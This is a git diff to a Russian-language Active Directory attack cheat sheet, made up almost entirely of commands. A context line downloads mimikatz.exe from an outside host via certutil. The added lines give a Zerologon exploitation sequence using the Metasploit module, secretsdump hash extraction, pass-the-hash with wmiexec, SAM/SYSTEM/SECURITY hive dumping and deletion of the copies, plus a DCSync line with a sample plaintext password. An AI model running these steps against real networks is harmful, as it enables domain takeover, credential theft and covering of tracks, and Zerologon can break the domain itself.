@@ -282,6 +282,8 @@ certutil -urlcache -split -f http://10.10.14.16/mimikatz.exe C:\Windows\System32
 - Поиск серверов с уязвимостью
 - Поиск секретов Wiki, confluence, jira
 - Petitpotam
+- Zerologon (Приводит к установке пустого пароля машинного аккаунта контроллера домена, что может повлечь нарушение работы домена в целом.)
+- DCSync (python3 secretsdump.py test.local/john:password123@10.10.10.1)
 
 
 **Поиск Gpp** 
@@ -328,6 +330,22 @@ ftp anonymous@hostname (anonymous)
 ls|prompt no|mget * .|
 
 wget -m ftp://anonymous:anonymous@hostname
+```
+# Zerologon
+
+```
+nmap -Pn -n -p 445 -sV -sC -v --open <victim_ip>
+msf6> use auxiliary/admin/dcerpc/cve_2020_1472_zerologon (set ACTION RESTORE -> set PASSWORD <$MACHINE.ACC hex password>)
+msf6> set RHOSTS <victim_ip>
+msf6> set NBNAME <victim_name>
+impacket-secretsdump -no-pass -just-dc-user administrator 'sandox.local/<victim_name>$@<victim_ip>'
+impacket-wmiexec -hashes <hash> 'sandbox.local/administrator@192.168.0.117'
+reg save HKLM\SYSTEM system.save
+reg save HKLM\SAM sam.save
+reg save HKLM\SECURITY security.save
+(impacket-wmiexec) lget system.save
+del /f system.save security.save sam.save
+impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
 ```
 
 # SMB
